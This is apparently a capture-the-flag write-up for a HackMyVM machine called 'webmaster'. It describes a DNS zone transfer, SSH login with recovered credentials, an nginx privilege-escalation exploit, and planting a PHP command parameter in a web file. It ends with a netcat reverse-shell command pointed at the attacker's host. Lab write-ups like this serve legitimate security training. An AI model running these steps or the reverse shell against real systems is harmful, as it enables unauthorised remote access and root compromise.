## PORT 80

Looking at the source

So this `webmaster.hmv` refers to a domain name let's add this to `/etc/hosts`.

Now by adding the domain name we are going to do a `Zone transfer` which is a DNS query type AXFR, is a type of DNS transaction.Zone transfers are typically used to replicate DNS data across a number of DNS servers or to back up DNS files.

We got `john`'s passwords so now let's ssh into the machine.

By running `sudo -l` we can see what can we run as root user

We can find an LPE (Local Privilege Escalation) for nginx

Let's download this to our machine and transfer it to target machine

<img src="https://i.ibb.co/bPhkV1w/Screenshot-2021-01-11-01-49-39.png"/>

To run this we need to provide the path of nginx error log which is located at `/var/log/nginx/error.log`

Run this like `./40768.sh /var/log/nginx/error.log`

But we couldn't run the exploit has it is needed to be run as `www-data` so only thing I could thing was to change the contents of one of the webserver files and insert a simple php GET paramter vulnerable code which will allow us to execute commands

Then you can just do `nc your_ip your_netcat_port -e /bin/bash` on `cmd` paramter to get reverse shell
